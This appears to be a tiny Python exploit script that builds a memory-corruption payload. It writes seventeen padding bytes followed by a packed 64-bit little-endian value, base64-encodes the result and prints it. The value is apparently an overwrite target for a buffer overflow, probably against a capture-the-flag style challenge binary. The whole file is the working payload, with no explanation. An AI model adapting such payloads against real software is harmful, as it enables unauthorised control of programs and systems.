
import sys
import struct
import base64

buf = b'nnnnnnnnnnnnnnnnn'
buf += struct.pack('<Q', 15460227198779683177)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
